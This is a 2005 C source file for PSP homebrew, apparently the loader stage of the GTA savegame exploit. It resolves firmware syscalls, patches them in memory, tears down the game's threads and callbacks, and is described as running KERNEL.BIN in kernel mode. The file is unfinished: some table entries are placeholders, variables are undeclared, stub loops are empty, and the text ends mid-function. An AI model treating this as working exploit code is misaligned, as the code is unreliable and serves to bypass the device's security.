/*
TSR loader
for Sony PSP firmware 2.0
(c) 16/11/2005 Fanjita <fanjita@fanjita.org>
- Modified and extended by Ditlew since before Xmas 2005. Why? To kill gta!

Loads KERNEL.BIN to 0x09EFD000, after protecting it with a malloc, then
starts it in kernel mode using the new exploit (exec at 0x09EFD004)

Uses exploit code from abu.
(c) 04/10/2005 abu <x@sunkone.cjb.net> http://sunkone.cjb.net/psp/

Uses print code from:
Hello World v1 for PSP v2.0
(w) 24/09/2005 by Groepaz/Hitmen
http://www.hitmen-console.org

*/

#define RUN_KERNEL_PROC       1
#define KERNEL_PROC_IS_DUMP   1
#define LOAD_CHECKEXEC_BIN    1
#define TEST_SAVEDATA         0

#include <pspthreadman.h>
#include "sce.c"

#define LOGGING  1
#define LOG_NIDS 1
#define DUMP_ALL_SYSCALLS     1
#define LOGFILE "ms0:/gtalog.txt"
#define RUNFILE "kernel.bin"
#define LOADADDR 0x09EFD000

#define NID_ENV_MODE_GAME  1


typedef void (*LOADERMAINFUNC)(int, int);

int g_loginitialised = 0;

void flashscreen(int cola, int colb)
{
  /***************************************************************************/
  /* Flash screen 10 times                                                   */
  /***************************************************************************/
  {
    int i;

    for (i=0; i<10; i++)
    {
      {
        long *lptr = 0x44000000;

        while (lptr < 0x44200000)
        {
          *lptr++ = cola;
        }

        lptr = 0x44000000;

        while (lptr < 0x44200000)
        {
          *lptr++ = colb;
        }
      }
    }
  }
}

// Made these for debugging
#if LOGGING
void dlog(char* msg)
{
	dlogi(msg,strlen(msg),1);
}

void dlog2(char* msg, char* msg2)
{
	dlogi2(msg,strlen(msg),msg2,strlen(msg2));
}

void dloghex8(int value)
{
	char dst[8];
	int i;
	static char hex[]="0123456789ABCDEF";
	for (i=0; i<8; i++)
	{
		dst[i]=hex[(value>>((7-i)*4))&15];
	}
	dlogi(dst,8, 1);
}

void dlog2hex8(char* msg, int value)
{
	char dst[8];
	int i;
	static char hex[]="0123456789ABCDEF";
	for (i=0; i<8; i++)
	{
		dst[i]=hex[(value>>((7-i)*4))&15];
	}
	dlogi2(msg,strlen(msg),dst,8);
}

void dlogi(char* msg, int msg_length, int newline)
{
  if (g_loginitialised)
  {
  	int fd = sceIoOpen(LOGFILE, O_WRONLY|O_CREAT|O_APPEND, 0777);
  	sceIoWrite(fd, msg, msg_length);
    if (newline)
    {
    	sceIoWrite(fd, "\n", 1);
    }
  	sceIoClose(fd);
  }
}

void dlogi2(char* msg, int msg_length, char* msg2, int msg_length2)
{
  if (g_loginitialised)
  {
  	int fd = sceIoOpen(LOGFILE, O_WRONLY|O_CREAT|O_APPEND, 0777);
  	sceIoWrite(fd, msg, msg_length);
  	sceIoWrite(fd, msg2, msg_length2);
  	sceIoWrite(fd, "\n", 1);
  	sceIoClose(fd);
  }
}

void clear_dlog()
{
	int fd = sceIoOpen(LOGFILE, O_WRONLY|O_CREAT|O_TRUNC, 0777);
	sceIoClose(fd);
  g_loginitialised = 1;
}
#else
void dlog(char* msg){};
void dlog2(char* msg, char* msg2){};
void dloghex8(){};
void dlog2hex8(char* msg, int value){};
void dlogi(char* msg, int msg_length,int newline){};
void dlogi2(char* msg, int msg_length, char* msg2, int msg_length2){};
void clear_dlog(){};
#endif

#define USER_PARTITION_START  0x08800000
#define USER_PARTITION_LENGTH 0x01800000


/*
typedef struct {
    unsigned long l1;             // unknown 0xd632acdb
    unsigned long l2;             // unknown 0xf01d73a7
    unsigned long startAddress;   // address of _start
    unsigned long moduleInfoAddr; // address of sceModuleInfo struct
} SceResidentData;
*/

#define OFFSET_MODULE_INFO_ADDR 0x1C // 28 bytes

/*
typedef struct {
    unsigned char c1, c2, c3, c4;
    char name[28];
    unsigned long gp;           // ptr to somewhere after executable
    unsigned long libEnt;       // ptr to .lib.ent section
    unsigned long libEntBtm;    // ptr to end of .lib.ent section
    unsigned long libStub;      // ptr to .lib.stub section
    unsigned long libStubBtm;   // ptr to end of .lib.stub section
} __attribute__((packed)) SceModuleInfo;
*/

#define OFFSET_LIB_ENT_TOP_ADDR    0x2C // 44 bytes
#define OFFSET_LIB_ENT_BOTTOM_ADDR 0x30 // 48 bytes

/*
typedef struct {
    const char *libname;	       // Library name.
    unsigned int flags;		       // Flags.
    unsigned char ent_len; 	       // Number of DWORDs in this entry. The size of the entry is ent_len * 4.
    unsigned char var_ent_count;   // Number of variable entries following function entries.
    unsigned short func_ent_count; // Number of function entries.
    unsigned int lib_loc  //
    unsigned int func_loc //
} SceLibEntData;
*/

#define OFFSET_FUNC_COUNT    0x0A // 10 bytes
#define OFFSET_LIB_LOC_ADDR  0x0C // 12 bytes
#define OFFSET_FUNC_LOC_ADDR 0x10 // 16 bytes

int main(void);
void _start(void) __attribute__ ((section (".text.start")));

// this is our "crt0". not real, very fake. but enough for now :=P
void _start(void)
{
	main();
}

void* memset(void *buffer, int c, int num)
{
	int i;
	int* tmp = (int*)buffer;
	for (i=0;i<num;i++)
	{
		tmp[i] = c;
	}
}

int strlen(char *s) {
	int i=0;
	while(*s++) i++;
	return i;
}

int stricmp(unsigned char *str1, unsigned char *str2)
{
	int i = 0;
	for(;str1[i];i++)
	{
		if (str1[i] > str2[i]) return 1;
		else
		if (str1[i] < str2[i]) return -1;
	}

	return 0;
}

void numtohex8(char *dst, int n)
{
   int i;
   static char hex[]="0123456789ABCDEF";
   for (i=0; i<8; i++)
   {
      dst[i]=hex[(n>>((7-i)*4))&15];
   }
}

//
//
//

int  clearCache()
{
  int lret = 0;
  int i;

	sceKernelDcacheWritebackInvalidateAll();
	sceKernelIcacheInvalidateAll();
	
	// Wait for cache flush
	for (i = 0; i < 9999999; i++)
	{
		lret++;
	}
    	
  return(lret);
}

void fillvideo(int xicolour)
{
	long *lptr = 0x44000000;

	while (lptr < 0x44200000)
	{
		*lptr++ = xicolour;
	}
}

typedef struct
{
	unsigned int NID;
	unsigned int pLoc;
	unsigned char *pLibName;
  unsigned int syscall;
} FUNCTIONS_TABLE;

int gDetectedFirmware;   // 200, 250, 260, 270 (incl. 271 or 280) - or +5 for update mode.

typedef struct
{
	unsigned int NID;
	unsigned int pLoc;
	unsigned int referenceNID;
  signed   int offsetFromReference20;
  signed   int offsetFromReference25;
  signed   int offsetFromReference26;
	signed   int offsetFromReference27;
  signed   int offsetFromReference205;
  signed   int offsetFromReference255;
  signed   int offsetFromReference265;
  signed   int offsetFromReference275;
} MISSING_FUNCTIONS_TABLE;

typedef struct
{
	unsigned char *pLibName;
	unsigned int   lowestNID;
	unsigned int   highestNID;
	unsigned short lowestSyscall;
	unsigned short highestSyscall;
	unsigned short firstSyscall;
	unsigned short lastSyscall;
	unsigned short numFuncs;

	// the following are used to determine loop offset
	unsigned int   referenceNID;        // a known NID from GTA
	unsigned int   referenceNIDoffset;  // its position within the module (offset from module start)
	signed   int   modulestartoffset;   // offset from start of this module to start of reference module
	unsigned char *referencemodule;     // name of a known module that we can deduce the offset index from
} MODULE_INFO_TABLE;

unsigned char IoFileMgrForUser[] = "IoFileMgrForUser";
unsigned char Threadman[]        = "ThreadManForUser";
unsigned char sceDisplay[]       = "sceDisplay";
unsigned char sceCtrl[]          = "sceCtrl";
unsigned char SysMem[]           = "SysMemUserForUser";
unsigned char ge[]               = "sceGe_user";
unsigned char UtilsForUser[]     = "UtilsForUser";
unsigned char InterruptManager[] = "InterruptManager";
unsigned char ModuleMgrForUser[] = "ModuleMgrForUser";
unsigned char SuspendForUser[]   = "sceSuspendForUser";
unsigned char UMDForUser[]       = "sceUmdUser";
unsigned char Power[]            = "scePower";
unsigned char sceAudio[]         = "sceAudio";
unsigned char sceUtility[]       = "sceUtility";
unsigned char LoadExecForUser[]  = "LoadExecForUser";

/*****************************************************************************/
/* These MUST be ordered in dependency order of the reference modules, or    */
/* the loop offset code for 2.7+ won't work.                                 */
/*                                                                           */
/* SceSuspendForUser must be the first one, and has a special-case NULL      */
/* reference module.                                                         */
/*****************************************************************************/
MODULE_INFO_TABLE module_info[] =
{
	{ &SuspendForUser,   0xFFFFFFFF, 0, 0, 0, 0xFFFF, 0, 0,  0x090CCB3F, 0, 0, NULL },

	// these ones work backwards from suspend
	{ &SysMem,           0xFFFFFFFF, 0, 0, 0, 0xFFFF, 0, 0,  0x13A5ABEF, 0, -11, &SuspendForUser},
	{ &ModuleMgrForUser, 0xFFFFFFFF, 0, 0, 0, 0xFFFF, 0, 0,  0x2E0911AA, 0, -16, &SysMem },
	{ &IoFileMgrForUser, 0xFFFFFFFF, 0, 0, 0, 0xFFFF, 0, 0,  0x06A70004, 0, -51, &ModuleMgrForUser }, // note - skips stdio
	{ &ThreadMan,        0xFFFFFFFF, 0, 0, 0, 0xFFFF, 0, 0,  0x1FB15A32, 9, -136, &IoFileMgrForUser }, // might be -135 to -132.  Might need to adjust the '9' too
	{ &InterruptManager, 0xFFFFFFFF, 0, 0, 0, 0xFFFF, 0, 0,  0xCA04A2B9, 3, -9, &ThreadMan },  // might be wrong

	// these ones work forwards from suspend
	{ &UtilsForUser,     0xFFFFFFFF, 0, 0, 0, 0xFFFF, 0, 0,  0x27CC57F0, 2, 6, &SuspendForUser },
	{ &LoadExecForUser,  0xFFFFFFFF, 0, 0, 0, 0xFFFF, 0, 0,  0x05572A5F, 0, 28, &UtilsForUser },
	{ &ge,               0xFFFFFFFF, 0, 0, 0, 0xFFFF, 0, 0,  0x05DB22CE, 1, 7, &LoadExecForUser },
	{ &sceAudio,         0xFFFFFFFF, 0, 0, 0, 0xFFFF, 0, 0,  0x136CAF51, 2, 43, &ge },
	{ &sceDisplay,       0xFFFFFFFF, 0, 0, 0, 0xFFFF, 0, 0,  0x0E20F177, 0, ?, &sceAudio },
	{ &sceCtrl,          0xFFFFFFFF, 0, 0, 0, 0xFFFF, 0, 0,  0x, ?, ?, &sceDisplay },
	{ &Power,            0xFFFFFFFF, 0, 0, 0, 0xFFFF, 0, 0,  0x, ?, ?, &sceCtrl },
	{ &UMDForUser,       0xFFFFFFFF, 0, 0, 0, 0xFFFF, 0, 0,  0x, ?, ?, &Power },
	{ &sceUtility,       0xFFFFFFFF, 0, 0, 0, 0xFFFF, 0, 0,  0x, ?, ?, &UMDForUser },

	{ NULL, 0, 0, 0, 0, 0, 0, 0 }
};

MISSING_FUNCTIONS_TABLE missing_functions[] =
{
	{ 0x94416130, (unsigned int)&sceKernelGetThreadmanIdList,  0x293b45b8,  8, 8, 58, 0, 8, 0, 0, 0 },
	{ 0x17c1684e, (unsigned int)&sceKernelReferThreadStatus,   0x293b45b8,  5, 5, -8, 0, 8, 0, 0, 0 },
	{ 0xba4051d6, (unsigned int)&sceKernelCancelCallback,      0x293b45b8, -107, -107, 72, 0, -107, 0, 0, 0 },
	{ 0x730ed8bc, (unsigned int)&sceKernelReferCallbackStatus, 0x293b45b8, -104, -104, 38, 0, -104, 0, 0, 0 },
	{ 0xef9e4c70, (unsigned int)&sceKernelDeleteEventFlag,     0x293b45b8, -82,  -82,  103, 0, -82, 0, 0, 0 },

	{ 0x920f104a, (unsigned int)&sceKernelIcacheInvalidateAll, 0xb435dec5,  6, 6, -2, 0, 6, 0, 0, 0 },

	{ 0xf919f628, (unsigned int)&sceKernelTotalFreeMemSize,    0x237dbd4f,  -1,   -8,  8, 0, -1, 0, 0, 0 },

	{ 0x8a389411, (unsigned int)&sceKernelDisableSubIntr,      0xd61e6961,  2,   2, -3, 0, 2, 0, 0, 0 },

	{ 0xbd2f1094, (unsigned int)&sceKernelLoadExec,            0x05572a5f,  -2, -2, 3, 0, 0, 0, 0, 0 },

	{ 0x977DE386, (unsigned int)&sceKernelLoadModule,          0x50F0C1EC,  -4, -4, 4, 0, 0, 0, 0, 0 },

  { 0, NULL, 0, 0, 0, 0, 0, 0, 0, 0, 0 }  // terminator
};

/*****************************************************************************/
/* You can set pLoc to 0 to just retrieve the syscall, but not update the    */
/* code.                                                                     */
/*****************************************************************************/
FUNCTIONS_TABLE functions[] = {
	{	0x109f50bc, (unsigned int)&sceIoOpen,  &IoFileMgrForUser, 0 },
	{	0x810c4bc3, (unsigned int)&sceIoClose, &IoFileMgrForUser, 0 },
	{	0x6a638d83, (unsigned int)&sceIoRead,  &IoFileMgrForUser, 0 },
	{	0x42ec03ac, (unsigned int)&sceIoWrite, &IoFileMgrForUser, 0 },
	
	{ 0x237dbd4f, (unsigned int)&sceKernelAllocPartitionMemory,  &SysMem, 0 },
	{ 0xb6d61d02, (unsigned int)&sceKernelFreePartitionMemory,   &SysMem, 0 },
	{ 0x9D9A5BA1, (unsigned int)&sceKernelGetBlockHeadAddr,      &SysMem, 0 },
	{ 0xa291f107, (unsigned int)&sceKernelMaxFreeMemSize,        &SysMem, 0 },

	{ 0x383f7bcc, (unsigned int)&sceKernelTerminateDeleteThread, &Threadman, 0 },
	{ 0x293b45b8, (unsigned int)&sceKernelGetThreadId,           &Threadman, 0 },
	{ 0x446D8DE6, (unsigned int)&sceKernelCreateThread,          &Threadman, 0 },
	{ 0xF475845D, (unsigned int)&sceKernelStartThread,           &Threadman, 0 },
	{ 0xceadeb47, (unsigned int)&sceKernelDelayThread,           &Threadman, 0 },
	{ 0xedba5844, (unsigned int)&sceKernelDeleteCallback,        &Threadman, 0 },
	{ 0xed1410e0, (unsigned int)&sceKernelDeleteFpl,             &Threadman, 0 },
	{ 0x28b6489c, (unsigned int)&sceKernelDeleteSema,            &Threadman, 0 },
	
	{ 0xd61e6961, (unsigned int)&sceKernelReleaseSubIntrHandler,&InterruptManager, 0 },
	{ 0xca04a2b9, (unsigned int)0,                              &InterruptManager, 0 },
	{ 0xfb8e22ec, (unsigned int)0,                              &InterruptManager, 0 },

	{ 0xb435dec5, (unsigned int)&sceKernelDcacheWritebackInvalidateAll, &UtilsForUser, 0 },
	{ 0x79D1C3FA, (unsigned int)&sceKernelDcacheWritebackAll, &UtilsForUser, 0 },

	{ 0xBD2BDE07, (unsigned int)&sceUmdUnRegisterUMDCallBack, &UMDForUser, 0 },

	{ 0xDFA8BAF8, (unsigned int)&scePowerUnregisterCallback, &Power, 0 },

  { 0x6fc46853, (unsigned int)&sceAudioChRelease,               &sceAudio, 0 },

  { 0x05572a5f, (unsigned int)&sceKernelExitGame,               &LoadExecForUser, 0 },

  { 0x50F0C1EC, (unsigned int)&sceKernelStartModule,            &ModuleMgrForUser, 0 },

  { 0x50c4cd57, (unsigned int)&sceUtilitySavedataInitStart,       &sceUtility, 0 },
  { 0x9790b33c, (unsigned int)&sceUtilitySavedataShutdownStart,   &sceUtility, 0 },
  { 0xd4b95ffb, (unsigned int)&sceUtilitySavedataUpdate,          &sceUtility, 0 },
  { 0x8874dbe0, (unsigned int)&sceUtilitySavedataGetStatus,       &sceUtility, 0 },

	{	0x00000000, NULL, NULL, 0	}  // list terminator
};

// This is how 20 first bytes of the GTA .rodata.sceResident looks like
unsigned char hash_values[0x14] = {
	0xDB, 0xAC, 0x32, 0xD6, // module_start (little-endian)
	0x3C, 0x59, 0xE8, 0xCE, // module_stop  (little-endian)
	0xA7, 0x73, 0x1D, 0xF0, // module_info  (little-endian)
	0x6C, 0x27, 0x7C, 0x0F,
	0x97, 0xC6, 0x0C, 0xCF
};

unsigned int find_gta_sceResident(unsigned char *data, unsigned int length)
{
	unsigned int i, j, found = 0;

	// find the gta .rodata.sceResident location
	for (i = 0, j = 0; i < length; i++)
	{
		// check a byte
		if (*(unsigned char *)(data + i) == hash_values[j])
		{
			// initialize pointer to beginning
			if (found == 0)
				found = i;

			// increase pointer in hash_values
			if (++j == 0x14)
				return found;
		}
		else
		{
			// not found
			j = found = 0;
		}
	}
	return 0;
}

int numfailed = 0;
int failednids[50];

int findKnownSyscall(unsigned long xiNID)
{
  int i;
  int lret = 0;

  for (i=0; functions[i].NID; i++)
  {
    if (functions[i].NID == xiNID)
    {
      lret = functions[i].syscall;
      break;
    }
  }

  return(lret);
}

/*****************************************************************************/
/* Find the module info entry for a given module name.                       */
/* Returns NULL if not found.                                                */
/* xiModuleName must be one of the char[] buffers statically-declared above, */
/* as pointer comparison (not string comparison) is used.                    */
/*****************************************************************************/
MODULE_INFO_TABLE *findModuleInfo(char * ximoduleName)
{
	MODULE_INFO_TABLE *lreturn = NULL;
	unsigned int       modinfo_index;

	for (modinfo_index = 0; module_info[modinfo_index].pLibName; modinfo_index++)
	{
		// note: no need for strcmp because we are dealing with pointers to
		// the same data.
		if (module_info[modinfo_index].pLibName == ximoduleName)
		{
			lreturn = &(module_info[modinfo_index]);
			break;
		}
	}

	return(lreturn)
}

void findNIDs(unsigned char *data, unsigned int length, unsigned int lib_stub_top, unsigned int lib_stub_bottom)
{
	unsigned short int num_funcs;
	unsigned int i, j, k, lib_loc, name_loc, func_loc, syscall_opcode;
	unsigned int modinfo_index, syscall;
	MODULE_INFO_TABLE *lmodinfo;
	int lfound;

	// process all functions
	for (i = 0; functions[i].NID; i++)
	{
		// process all libraries
		// 20 bytes (0x14) used on each library
		for (j = lib_stub_top; j < lib_stub_bottom; j += 0x14)
		{
			// check if this is the one we want
			name_loc = *(unsigned int *)&data[j] - USER_PARTITION_START;
			if (!stricmp((unsigned char *)&data[name_loc], functions[i].pLibName))
			{
				// we've found a lib that we're interested in.  Now process all NIDs.
				lfound = 0;

				num_funcs = *(unsigned short int *)(&data[j + OFFSET_FUNC_COUNT]);
				lib_loc   = *(unsigned int *)      (&data[j + OFFSET_LIB_LOC_ADDR ]) - USER_PARTITION_START;
				func_loc  = *(unsigned int *)      (&data[j + OFFSET_FUNC_LOC_ADDR]) - USER_PARTITION_START;

				lmodinfo = findModuleInfo(functions[i].pLibName);

				// it's a module for which we want to record the info.
				if (lmodinfo)
				{
					// if we already have data here, check that it agrees with the
					// current data.
					if (lmodinfo->numFuncs != 0)
					{
						if (lmodinfo->numFuncs != num_funcs)
						{
// syscalls required for dlog not yet determined
//							dlog(functions[i].pLibName);
//							dlog2hex8("Num funcs does not match previous value", num_funcs);
						}
					}
					else
					{
//						dlog(functions[i].pLibName);
//						dlog2hex8("Record num funcs", num_funcs);
						lmodinfo->numFuncs = num_funcs;
					}
				}

				for (k = 0; k < num_funcs; k++)
				{
					unsigned int thisNID = *(unsigned int *)(&data[lib_loc + (k * 0x04)]);

					syscall_opcode = *(unsigned int *)(&data[func_loc + (k * 0x08) + 0x04]);
					syscall = syscall_opcode >> 6;

					// record NID info if required
					if (lmodinfo)
					{
						if (thisNID < lmodinfo->lowestNID)
						{
//							dlog(functions[i].pLibName);
//							dlog2hex8("New lowest NID", thisNID);
							lmodinfo->lowestNID = thisNID;
							lmodinfo->lowestSyscall = syscall;
//							dlog2hex8("  with syscall ", syscall);
						}
						
						if (thisNID > lmodinfo->highestNID)
						{
//							dlog(functions[i].pLibName);
//							dlog2hex8("New highest NID", thisNID);
							lmodinfo->highestNID = thisNID;
							lmodinfo->highestSyscall = syscall_opcode >> 6;
//							dlog2hex8("  with syscall ", syscall);
						}

						if (syscall < lmodinfo->firstSyscall)
						{
							lmodinfo->firstSyscall = syscall;
						}

						if (syscall > lmodinfo->lastSyscall)
						{
							lmodinfo->lastSyscall = syscall;
						}
					}

					// check if this is the one we want
					if (thisNID == functions[i].NID)
					{
						// patch the syscall to what it should be

            functions[i].syscall = syscall;

            /*****************************************************************/
            /* Only actually modify the code if pLoc is non-null             */
            /*****************************************************************/
            if (functions[i].pLoc)
            {
  						// force the address to be uncached
  						functions[i].pLoc |= 0x40000000;

  						// find the syscall opcode, and replace it
  						{
  							int l;
  							unsigned int opcode;
  							for (l=0; l<20; l++)
  							{
  								opcode = ((unsigned int *)(functions[i].pLoc))[l];
  								if ((opcode & 0xFF00000FL) == 0x0000000CL)
  								{
#if LOG_NIDS
//                    dlog2hex8("Found syscall for NID:", functions[i].NID);
//                    dlog2hex8("Replace with syscall: ", functions[i].syscall);
#endif
  									((unsigned int *)(functions[i].pLoc))[l] = syscall_opcode;
  									lfound = 1;
  									break;
  								}
  							}
  						}
            }
            else
            {
              lfound = 1;
            }
					}
				}
				if (!lfound)
				{
					failednids[numfailed++] = functions[i].NID;
				}
				break;
			}
		}
	}

  /***************************************************************************/
  /* Decide which firmware version we're on, based on known NIDs             */
  /***************************************************************************/
  if (findKnownSyscall(0x293b45b8L) == 0x207b)
  {
    /*************************************************************************/
    /* sceKernelExitGame is different in update mode                         */
    /*************************************************************************/
    if (findKnownSyscall(0x05572a5f) == 0x20f2)
    {
      gDetectedFirmware = 200;
    }
    else
    {
      gDetectedFirmware = 205;
      flashscreen(0, -1);
    }
  }
  else if ((findKnownSyscall(0xfb8e22ecL) - findKnownSyscall(0xca04a2b9)) == 2)
  {
    gDetectedFirmware = 250;
  }
  else
  {
    gDetectedFirmware = 260;
  }

  /***************************************************************************/
  /* For higher firmwares, the syscalls are somewhat flexible.  We treat     */
  /* 2.70, 2.71 and 2.80 as identical, because we'll be determining the      */
  /* syscalls in a new way anyway.                                           */
  /*                                                                         */
  /* We can detect this new syscall system by checking for any looped 			 */
  /* NID lists in the modules that we expect to have completely ordered.     */
  /*                                                                         */
  /* Looped lists can be detected by seeing whether the numerically-lowest   */
  /* NID has a higher syscall than the numerically-highest.  Oh looky, we    */
  /* saved all the info for that in module_info[].                           */
  /*                                                                         */
  /* BTW - are there any larger modules in 2.70+?  Maybe this can 					 */
  /* distinguish them.                                                       */
  /***************************************************************************/
	if (gDetectedFirmware == 260)
	{
		foundLoopedList = 0;
		for (lmodinfo = module_info; lmodinfo->pLibName; lmodinfo++)
		{
			// check that we have highest and lowest data for this module
			if ((lmodinfo->highestNID != 0) &&
					(lmodinfo->lowestNID != 0xFFFFFFFF))
			{
				if (lmodinfo->lowestSyscall > lmodinfo->highestSyscall)
				{
					dlog2("Found looped syscalls in module ", lmodinfo->pLibName);
					foundLoopedList = 1;
					break;
				}
			}
		}

		if (foundLoopedList)
		{
			gDetectedFirmware = 270;
		}
	}

  dlog2hex8("Firmware detected: ", gDetectedFirmware);

  /***************************************************************************/
  /* Now fix up the ones that we have to do by inference.  We handle this    */
  /* differently on v2.7+.                                                   */
  /***************************************************************************/
	if (gDetectedFirmware < 270)
	{
		for (i = 0; missing_functions[i].NID; i++)
		{
			unsigned int syscall = findKnownSyscall(missing_functions[i].referenceNID);
			unsigned int syscall_opcode;

			lfound = 0;

			switch (gDetectedFirmware)
			{
				case 200:
					syscall += missing_functions[i].offsetFromReference20;
					break;
				case 250:
					syscall += missing_functions[i].offsetFromReference25;
					break;
				case 260:
					syscall += missing_functions[i].offsetFromReference26;
					break;
				case 205:
					syscall += missing_functions[i].offsetFromReference205;
					break;
				case 255:
					syscall += missing_functions[i].offsetFromReference255;
					break;
				case 265:
					syscall += missing_functions[i].offsetFromReference265;
					break;
			}

			syscall_opcode = (syscall << 6) | 0x0c;
			missing_functions[i].pLoc |= 0x40000000;

			// find the syscall opcode, and replace it
			{
				int l;
				unsigned int opcode;
				for (l=0; l<20; l++)
				{
					opcode = ((unsigned int *)(missing_functions[i].pLoc))[l];
					if ((opcode & 0xFF00000FL) == 0x0000000CL)
					{
						((unsigned int *)(missing_functions[i].pLoc))[l] = syscall_opcode;
	#if LOG_NIDS
						dlog2hex8("Found syscall for missing NID:", missing_functions[i].NID);
						dlog2hex8("Replace with syscall: ", syscall);
	#endif
						lfound = 1;
						break;
					}
				}
			}

			if (!lfound)
			{
				failednids[numfailed++] = missing_functions[i].NID;
			}
		}
	}
	else
	{
    /*************************************************************************/
    /* Need to work out the missing syscalls, based on the looped syscall    */
    /* mechanism in v2.7+.                                                   */
    /*                                                                       */
		/* First work out the calibration data from the sceSuspend module.       */
    /*                                                                       */
    /* We know that it is directly following the LoadExec syscalls, so from  */
    /* that we can determine the extent of looping in LoadExec.              */
		/*************************************************************************/
		unsigned int       loffset_Suspend;
		MODULE_INFO_TABLE *lmodinfo_Suspend = findModuleInfo(&SuspendForUser);

    /*************************************************************************/
	  /* Calculate the loop offset for suspend.                                */
    /*                                                                       */
    /* There are 5 syscalls in suspend, out of 6 possible.                   */
    /* So, the possible scenarios are:                                       */
    /*                                                                       */
    /* A   123456                                                            */
    /* B   234561                                                            */
    /* C   345612                                                            */
    /* D   456123                                                            */
    /* E   561234                                                            */
    /* F   612345                                                            */
    /*                                                                       */
    /* We have data points for   12 456, so...                               */
    /*                                                                       */
    /* If 4 is the first syscall, then we have case C or D.  If 2 is the     */
    /* last syscall, then we have C or D.  There is no way to tell these     */
    /* apart, EXCEPT that:                                                   */
    /*                                                                       */
    /* We know the last syscall for the previous module (SysMemUserForUser). */
    /* But that has lots of gaps in the sequence, so it's not very reliable. */
    /*                                                                       */
    /* Still, most of the time we should get a good result by combining      */
    /* those 2 pieces of data.                                               */
    /*                                                                       */
    /* For now, let's just assume that case D or C is just D.  In which      */
    /* case, the loop offset for Suspend is simply syscall(1) - firstSyscall.*/
    /*                                                                       */
    /* From there, we can work out the loop offsets for all other modules,   */
    /* once we know the size of the gaps between them.                       */
	  /*************************************************************************/
		loffset_Suspend = findKnownSyscall(0x090CCB3F) - lmodinfo_Suspend->firstSyscall;

		// determine loop offsets for each module here
		for (lmodinfo = module_info; lmodinfo->pLibName; lmodinfo++)
		{
		}

		// Now fix up the missing NIDs using the loop offset - basically the
		// same as the unlooped code, with addition of loopoffset modulo module size.
		// XXX - can probably reuse the code above, in fact.
		for (i = 0; missing_functions[i].NID; i++)
		{
		}

		// should try resolving some of the known nids in each module, to double-check
		// the algorithm
	}
}

#if	DUMP_ALL_SYSCALLS
void listNIDs(unsigned char *data, unsigned int length, unsigned int lib_stub_top, unsigned int lib_stub_bottom)
{
	unsigned short int num_funcs;
	unsigned int j, k, lib_loc, name_loc, func_loc, syscall_opcode;
	int lnidnum, lsyscall;

	// process all libraries
	// 20 bytes (0x14) used on each library
	for (j = lib_stub_top; j < lib_stub_bottom; j += 0x14)
	{
		name_loc = *(unsigned int *)&data[j] - USER_PARTITION_START;
		dlog((unsigned char *)(&data[name_loc]));

 		// process all NIDs
 		num_funcs = *(unsigned short int *)(&data[j + OFFSET_FUNC_COUNT]);
 		lib_loc   = *(unsigned int *)      (&data[j + OFFSET_LIB_LOC_ADDR ]) - USER_PARTITION_START;
 		func_loc  = *(unsigned int *)      (&data[j + OFFSET_FUNC_LOC_ADDR]) - USER_PARTITION_START;

 		for (k = 0; k < num_funcs; k++)
 		{
 			syscall_opcode = 0;
 			// check if this is the one we want
			lnidnum = *(unsigned int *)(&data[lib_loc + (k * 0x04)]);

 			syscall_opcode = *(unsigned int *)(&data[func_loc + (k * 0x08) + 0x04]);

      lsyscall = syscall_opcode >> 6;

      dlog2hex8("Found syscall for NID:", lnidnum);
      dlog2hex8("Replace with syscall: ", lsyscall);
 		}
 		break;
	}
}
#endif

void initial_setup(unsigned char *data, unsigned long length)
{
	unsigned int sceRes, module_info, lib_ent_top, lib_ent_bottom;

	// find sceResident
	sceRes = find_gta_sceResident(data, length);
	if (sceRes > 0)
	{
		// setup the necessary locations
		module_info     = *(unsigned int *)(&data[sceRes]     + OFFSET_MODULE_INFO_ADDR    ) - USER_PARTITION_START;
		lib_ent_top     = *(unsigned int *)(&data[module_info + OFFSET_LIB_ENT_TOP_ADDR   ]) - USER_PARTITION_START;
		lib_ent_bottom  = *(unsigned int *)(&data[module_info + OFFSET_LIB_ENT_BOTTOM_ADDR]) - USER_PARTITION_START;

#if DUMP_ALL_NIDS
		listNIDs(data, length, lib_ent_top, lib_ent_bottom);
#endif

		// start finding the NID's
		findNIDs(data, length, lib_ent_top, lib_ent_bottom);
	}
}

#define MAX_THREADS 25
int threads[MAX_THREADS];
int nthreads;

void DeleteAllThreads()
{
	SceKernelThreadInfo ti;
	int i,j;
	int lthreadid = sceKernelGetThreadId();
	int lrc;

	nthreads=0;
	i=sceKernelGetThreadmanIdList(1, threads, MAX_THREADS * sizeof(int), &nthreads);
	for (i=0; i<nthreads; i++)
	{
		ti.size = sizeof(SceKernelThreadInfo);
		j=sceKernelReferThreadStatus(threads[i], &ti);
		if (j >= 0)
		{
			if (threads[i] != lthreadid)
			{
				lrc = sceKernelTerminateDeleteThread(threads[i]);
				if (lrc >= 0)
				{
					dlog2("Deleted Thread: ",ti.name);
				}// else dlog2("Error deleting Thread: ",ti.name);
			}
		}
	}
}

void DeleteAllCallbacks()
{
	int ids[64];
	int i,j, lrc, count;
	SceKernelCallbackInfo info;

  dlog("Get threadman callback IDs");

	memset(&info,0,sizeof(SceKernelCallbackInfo));
	info.size = sizeof(SceKernelCallbackInfo);

	count=0;	
	sceKernelGetThreadmanIdList(SCE_KERNEL_TMID_Callback, ids, sizeof(ids) * sizeof(int), &count);
	for (i=0; i<count; i++)
	{
    //dlog2hex8("Get callback status for ID: ", i);
		int j=sceKernelReferCallbackStatus(ids[i], &info);
		if (j>=0)
		{
      //dlog2hex8("got status, cancel it: ", ids[i]);
			lrc = sceKernelCancelCallback(ids[i]);
			if (lrc < 0)
			{
				dlog2("Error Cancelling Callback: ",info.name);
			}					
			else
			{
				dlog2("Cancelled Callback: ",info.name);
				lrc = sceKernelDeleteCallback(ids[i]);
				if (lrc >= 0)
				{
					dlog2("Deleted Callback: ",info.name);
				} else dlog2("Error deleting Callback: ",info.name);
			}
		}
	}
}

void DeleteAllFpls()
{
	int ids[64];
	int i, lrc, count;

	count=0;
	sceKernelGetThreadmanIdList(SCE_KERNEL_TMID_Fpl, ids, sizeof(ids) * sizeof(int), &count);

	for (i=0; i<count; i++)
	{
		lrc = sceKernelDeleteFpl(ids[i]);
		if (lrc >= 0)
		{
			dlog2hex8("Deleted Fpl: ",ids[i]);
		}// else dlog2hex8("Error deleting Fpl: ",ids[i]);
	}
}

void DeleteAllSemas()
{
	int ids[64];
	int i, lrc, count;

	count=0;
	sceKernelGetThreadmanIdList(SCE_KERNEL_TMID_Semaphore, ids, sizeof(ids) * sizeof(int), &count);

